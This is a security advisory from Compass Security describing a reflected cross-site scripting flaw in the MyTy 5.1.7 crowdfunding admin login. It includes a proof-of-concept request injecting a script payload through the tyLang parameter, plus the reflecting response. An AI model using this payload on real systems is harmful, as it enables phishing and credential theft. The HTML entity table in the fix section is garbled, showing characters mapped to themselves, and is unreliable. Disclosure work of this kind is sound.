@@ -1,0 +1,136 @@
+id: 29035
+date: 11/22/2017
+title: MyTy 5.1.7 Cross Site Scripting Vulnerability
+author: Nicolas Heiniger
+cves: 
+
+#############################################################
+#
+# Product:  MyTy
+# Vendor:   Finlane GmbH
+# CSNC ID:  CSNC-2017-030
+# CVE ID:   -
+# Subject:  Reflected Cross-Site Scripting (XSS)
+# Risk:     High
+# Effect:   Remotely exploitable
+# Author:   Nicolas Heiniger <nicolas.heiniger@compass-security.com>
+# Date:     21.11.2017
+#
+#############################################################
+
+Introduction:
+-------------
+MyTy[1] is a software framework that includes a crowdfunding module. It can be
+installed on a customer server and used to create whitelabel websites for
+crowdfunding platforms.
+
+Compass Security discovered a web application security flaw in the login page of
+ the administration web console that allows an unauthenticated attacker to
+ execute JavaScript code in the browser of a legitimate user. This allows, for
+ instance, to redirect the user to a phishing page and gather credentials.
+
+
+Affected:
+---------
+Vulnerable:
+ * MyTy 5.1.0 to 5.1.7
+
+
+Technical Description
+---------------------
+In the login page of the administration console, a tyLang parameter is passed
+together with the user and the password in the login request. This parameter is
+then included unencoded in the HTTP response.
+
+The login request for a proof of concept is as follows:
+===============
+POST /tycon/index.php HTTP/1.1
+Host: [CUT BY COMPASS]
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: [CUT BY COMPASS]
+Cookie: tyFl=de_de; XSRF-TOKEN=ZNc%2FZRg4sCgXP0g3IZZ8QxsO7caLshyKp7u75yiyW5o%3D;
+ lang=de; PHPSESSID=b4pcsacfvpv716e3l825cqbuo3; tyBl=en_us; cfce=1;
+ _ga=GA1.2.75537659.1504612703; cf_cookie_policy_read=1;
+ _gid=GA1.2.1498092563.1504761922
+CSNC-HEN: Pentest1-Blue
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 97
+
+view=default&fromTopic=&tyLang=de"</script><script>alert(1)</script>
+&seleted_user_id=0&seleted_user_hash=&name=admin&password=123456
+===============
+
+The HTTP response shows that the payload is returned unencoded in the HTML page:
+===============
+HTTP/1.1 200 OK
+Server: nginx
+Date: Thu, 07 Sep 2017 06:52:05 GMT
+Content-Type: text/html; charset=utf-8
+
+[CUT BY COMPASS]
+
+<!DOCTYPE HTML>
+<html>
+        <head>
+                <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+                <meta name="robots" content="noindex,nofollow">
+                <base target="_top"/>
+                <title>myty-Login | myty 5.1.7/2017-09-06</title>
+                <meta name="viewport" content="width=device-width, initial-scale=1.0,
+                minimum-scale=1.0"/>
+                <!-- Adding "maximum-scale=1" fixes the Mobile Safari auto-zoom bug:
+                http://filamentgroup.com/examples/iosScaleBug/ -->
+                <link href="/tycon/themes/spring/styles/defaultlogin.css"
+                rel="stylesheet" type="text/css"/>
+                <!--[if gte IE 9]>
+                <style type="text/css">
+                .gradient {filter: none;}
+                </style>
+                <![endif]-->
+                <script src="/3rdParty/bower_components/jquery/dist/jquery.min.js">
+                </script>
+                <script type="text/javascript">var myty = {
+        version: '5.1.7',
+        revision: 5001007,
+        backend: {
+                basepath: '/tycon',
+                language: 'de"</script><script>alert(1)</script>',
+                themepath: '/tycon/themes/spring'
+        },
+[CUT BY COMPASS]
+===============
+
+
+Workaround / Fix:
+-----------------
+Install an up to date version of the MyTy software.
+
+As a developer:
+This issue can be fixed by properly encoding dangerous characters in the output
+according to the encoding rules of the respective type of context (HTML body,
+argument, JS string, generated URLs). For normal HTML body content, the
+following HTML entities can be used:
+<    ->    <
+>    ->    >
+"    ->    "
+'    ->    '
+&    ->    &
+
+
+Timeline:
+---------
+2017-11-21:     Coordinated public disclosure date
+2017-09-08:     Release of fix in version 5.1.8
+2017-09-08:     Initial vendor response
+2017-09-07:     Initial vendor notification
+2017-09-07:     Discovery by Nicolas Heiniger
+
+
+References:
+-----------
+[1] https://www.finlane.com/loesungen/whitelabel-pages/
+
+#  0day.today [2023-03-23]  #
